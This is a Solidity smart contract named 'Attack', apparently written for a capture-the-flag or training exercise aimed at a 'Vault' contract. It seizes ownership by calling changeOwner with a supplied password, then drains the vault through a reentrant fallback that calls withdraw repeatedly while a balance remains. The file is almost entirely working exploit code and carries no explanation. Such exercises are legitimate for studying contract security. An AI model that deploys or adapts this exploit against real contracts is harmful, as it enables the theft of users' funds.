// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";
import "forge-std/console.sol";


contract Attack {
    Vault public vault;

    constructor(address payable _vaultAddress) {
        vault = Vault(_vaultAddress);
    }
        
    
    fallback() external payable {
        if(address(vault).balance > 0) {
            vault.withdraw();
        }
    }


    function attack(bytes32 password) external payable {
        
        vault.deposite{value: 0.2 ether}();

        bytes memory data = abi.encodeWithSignature(
                "changeOwner(bytes32,address)",
                password,
                address(this)
            );

        (bool success, ) = address(vault).call(data);
        
        vault.openWithdraw();
        vault.withdraw();
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

}